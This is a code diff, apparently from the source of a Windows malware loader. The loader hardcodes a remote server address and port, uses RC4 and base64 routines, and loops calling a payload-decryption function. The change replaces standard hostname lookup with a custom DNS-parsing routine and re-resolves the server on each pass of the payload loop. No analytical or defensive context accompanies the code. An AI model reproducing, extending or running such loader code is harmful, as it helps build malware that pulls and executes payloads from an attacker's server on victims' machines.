@@ -1,3 +1,4 @@
+#include"dns.h"
 #include <windows.h>  
 #include <string>
 #include "b64/base64.h"
@@ -10,6 +11,7 @@
 #include "rc4/ARC4.h"
 
 const char target[] = "167.179.71.52";
+char t_ip[20];
 char * ip;
 const int  port = 81;
 const char obscure[] = "vtyuiaslkjfasfalsflkhlksadjlkgjlkdsajglkadnlkgsd";
@@ -20,27 +22,13 @@ struct in_addr addr;
 typedef PVOID(*M) (DWORD, DWORD, DWORD, DWORD);
 
 void GetIP() {
-	int ret;
-	WSADATA wsaData;
-	ret = WSAStartup(0x101, &wsaData);
 
-
-	if (ret != 0)
-	{
-		ip = (char *)target;
-		return;
+	if (parse_domain(target, t_ip) == false) {
+		ip = (char*)target;
 	}
-	hostent* host;
-	host = gethostbyname(target);
-	if (!host)
-	{
-		ip = (char *)target;
-
-		return;
+	else {
+		ip = t_ip;
 	}
-	addr.s_addr = *(unsigned long *)host->h_addr;
-	ip = inet_ntoa(addr);
-	WSACleanup();
 	return;
 }
 std::string GenerateUri()
@@ -112,6 +100,7 @@ void Invoke()
 {
 	Sleep(2000);
 	while (TRUE) {
+		GetIP();
 		DecPayload(GetKey());
 		Sleep(2000);
 	}
